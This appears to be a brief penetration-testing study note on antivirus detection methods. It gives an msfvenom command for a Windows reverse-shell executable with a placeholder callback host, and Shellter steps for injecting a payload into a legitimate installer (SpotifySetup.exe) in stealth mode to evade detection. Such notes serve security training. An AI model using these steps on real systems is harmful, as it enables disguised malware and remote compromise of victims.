---
title: 10 - AV Detection Methods
updated: 2025-04-23 11:14:49Z
created: 2025-04-23 10:56:02Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Signature-Based Detection
## Heuristic-Based Detection
## Behaviour-Based Dection
## Machine-Learning Detection
* * *
1. Create a **reverse shell** executable using **msfvenom**
`msfvenom -p windows/shell_reverse_tcp LHOST=x.x.x.x LPORT=xxx -f exe > binary.exe`
2. Run a virus scan on the executable:
`firefox https://www.virustotal.com/#/home/upload`
* * *
## Automating payloads with **Shellter**
Shellter attempts to use the exsting PE Import Address Table (IAT)  entries to locate functions that will be used for the memory allocation, transfer and execution of the payload.

1. Launch `shellter` from kali, choose Auto mode
2. Select a target executable to inject malicious code:
eg `/home/kali/Downloads/SpotifySetup.exe`
3. Enable Stealth Mode : **Y**
4. Use a listed payload : **L**
5. Select appropriate payload